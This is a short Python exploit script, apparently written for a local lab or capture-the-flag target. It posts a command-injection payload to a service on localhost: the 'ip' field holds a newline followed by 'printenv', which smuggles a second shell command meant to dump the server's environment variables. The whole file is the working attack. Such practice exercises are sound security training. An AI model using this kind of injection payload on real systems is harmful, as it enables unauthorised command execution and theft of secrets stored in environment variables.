import requests

TARGET_URL = "http://localhost:55655"

print(requests.post(TARGET_URL, data={"ip": "\nprintenv"}).text)